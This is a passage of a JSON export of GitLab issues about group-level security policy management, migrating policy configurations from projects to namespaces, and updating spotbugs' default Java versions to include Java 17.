`ee/app/graphql/mutations/security_policy/unassign_security_policy_project.rb` to have `argument :namespace_path` or `argument :full_path` (`GraphQL::Types::ID, required: true`), mark `:project_path` argument as deprecated (using `deprecated: { reason: \"\", milestone: \"\" }` param), modify `resolve` method to find namespace instead of project (and fallback to project when namespace is not found), modify `assign_project` method to accept namespace,\n- [x] ~backend modify `::Security::Orchestration::UnassignService` (`ee/app/services/security/orchestration/unassign_service.rb`) to accept `namespace` instead of `project`,\n\n\nNOTES:\n\n1. Both `namespace` and `project` will have `has_one: security_orchestration_policy_configuration` relationship, so we only need to modify services in `ee/app/services/security/security_orchestration_policies` to accept namespace instead of project (mainly we need to rename `project` to `namespace` (or `container`), no logic change is needed, this is only to increase readability of these classes)\n1. For now (until https://gitlab.com/gitlab-org/gitlab/-/issues/337100 is not merged) we need to support both project and namespace in all migrations/services \n\nAll of these share a common implementation (using `project_path` to find the affected project), so we can update them all at once.\n\n1. Add a new `full_path` argument, which can be a project or group path (will workspaces have a path?)\n1. If it is set, find the namespace by the `full_path` rather than the `project_path`\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T19:06:42.300Z","updated_at":"2022-05-23T11:42:18.064Z","closed_at":"2022-05-17T04:05:08.324Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueir","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["Category:Security Policy Management","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"}],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347069","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":16,"completed_count":9},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"9 of 16 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347069","notes":"https://gitlab.com/api/v4/projects/278964/issues/347069/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347069/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347069","relative":"#347069","full":"gitlab-org/gitlab#347069"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4425,"epic":{"id":114110,"iid":4425,"title":"Group Level Policy Management","url":"/groups/gitlab-org/-/epics/4425","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98370736,"iid":347067,"project_id":278964,"title":"Update spotbugs default java versions to include 17","description":"### Proposal\n\nWe should update our default Java versions within spotbugs. Non-default versions are still supported by way of pre-compilation but the out-of-the-box configuration should support LTS versions.\n\n### Reasoning\n\n- More-recent versions are a common request.\n- It's never great to have a security product make you jump through hoops to use the latest version of languages and other dependencies. In fact we are adding general advice to use recent language versions in various places (https://gitlab.com/gitlab-com/legal-and-compliance/-/issues/729)it's awkward if we don't then make it easy to do so.","state":"closed","created_at":"2021-12-02T18:53:45.632Z","updated_at":"2022-04-26T15:08:52.329Z","closed_at":"2022-02-23T21:06:51.384Z","closed_by":{"id":5057937,"username":"dsearles","name":"Daniel Paul Searles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5057937/avatar.png","web_url":"https://gitlab.com/dsearles"},"labels":["Category:SAST","Deliverable","backend","customer","devops::secure","feature::enhancement","group::static analysis","missed-deliverable","missed:14.8","section::sec","type::feature","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5057937,"username":"dsearles","name":"Daniel Paul Searles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5057937/avatar.png","web_url":"https://gitlab.com/dsearles"}],"author":{"id":401232,"username":"theoretick","name":"Lucas Charles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/401232/squares-nail-wall-art.jpg","web_url":"https://gitlab.com/theoretick"},"type":"ISSUE","assignee":{"id":5057937,"username":"dsearles","name":"Daniel Paul Searles","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5057937/avatar.png","web_url":"https://gitlab.com/dsearles"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347067","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347067","notes":"https://gitlab.com/api/v4/projects/278964/issues/347067/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347067/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347067","relative":"#347067","full":"gitlab-org/gitlab#347067"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7201,"epic":{"id":397087,"iid":7201,"title":"15.0 Deprecations and Removals Work - Static Analysis","url":"/groups/gitlab-org/-/epics/7201","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98370040,"iid":347066,"project_id":278964,"title":"Allow `ScanExecutionPolicyResolver` to resolve group-level policies","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nAs part of the implementation for Group-level security policies (https://gitlab.com/groups/gitlab-org/-/epics/4425), we need to update `ScanExecutionPolicyResolver` to be able to return group-level security policies.\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\n1. Add a new scope to `OrchestrationPolicyConfiguration` which will query all the policy configurations by `namespace.self_and_ancestors`.\n1. Create a new `PolicyFinder` which will query all of the policy configurations, get all of their policies, and then merge them together.\n1. Add a new `relationship` parameter to the `scanExecutionPolicies` graphql query which can have the values `DIRECT` or `INHERITED`. `DIRECT` will be the default and will return policies belonging to the project only (current behavior). `INHERITED` will return the project's policies as well as the ancestor's policies. (This prevents breaking changes to facilitate [Zero-downtime upgrades](https://docs.gitlab.com/ee/update/zero_downtime.html).)\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T18:39:28.316Z","updated_at":"2022-05-16T15:26:55.170Z","closed_at":"2022-05-16T15:26:37.630Z","closed_by":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"labels":["Category:Security Policy Management","backend","devops::govern","feature::addition","group::security policies","missed:14.10","section::sec","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":null,"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347066","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":7,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 7 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347066","notes":"https://gitlab.com/api/v4/projects/278964/issues/347066/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347066/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347066","relative":"#347066","full":"gitlab-org/gitlab#347066"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4425,"epic":{"id":114110,"iid":4425,"title":"Group Level Policy Management","url":"/groups/gitlab-org/-/epics/4425","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98369704,"iid":347064,"project_id":278964,"title":"Migrate security policy models and workers to ProjectNamespace","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nIn order to facilitate future work to implement Group https://gitlab.com/groups/gitlab-org/-/epics/4425 and Workspace-level https://gitlab.com/groups/gitlab-org/-/epics/6881 security policies, we need to migrate the security policy objects to be related to a namespace rather than a project (see https://gitlab.com/groups/gitlab-org/-/epics/6473 for more details).\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [-] Documentation:\n- [-] Feature flag:\n- [-] Performance:\n- [ ] Testing: modify tests for updated classes/modules to include specs for new relationship,\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\nThe following classes need to be updated:\n\n- [x] ~backend extend `ee/app/models/security/orchestration_policy_configuration.rb` with `belongs_to :namespace, foreign_key: :namespace_id, optional: true`, modify `belongs_to :project` relationship to be optional and add validation rule to check that either `group` or `project` is provided,\n- [x] ~database ~~prepare background migration for `security_orchestration_policy_configurations` table to populate namespace_id column with `project.project_namespace_id` data,~~\n- [x] ~database add `namespace_id` column to `security_orchestration_policy_configurations` table,\n- [x] ~backend modify `#applicable_branches` method in `ee/app/models/security/orchestration_policy_rule_schedule.rb` to support `project` argument (default: `security_orchestration_policy_configuration.project`),\n- [x] ~backend add new scope `with_configuration_and_group_projects` in `ee/app/models/security/orchestration_policy_rule_schedule.rb` to groups with projects,\n- [x] ~backend extend `perform` method in `ee/app/workers/security/orchestration_policy_rule_schedule_worker.rb` to run schedule for all projects within the group that is associated with selected `security_policy_management_project`,\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T18:29:08.765Z","updated_at":"2022-04-18T09:41:08.664Z","closed_at":"2022-04-18T09:41:08.641Z","closed_by":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"labels":["Category:Security Policy Management","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"}],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347064","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":10,"completed_count":6},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"6 of 10 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347064","notes":"https://gitlab.com/api/v4/projects/278964/issues/347064/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347064/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347064","relative":"#347064","full":"gitlab-org/gitlab#347064"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4425,"epic":{"id":114110,"iid":4425,"title":"Group Level Policy Management","url":"/groups/gitlab-org/-/epics/4425","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null}]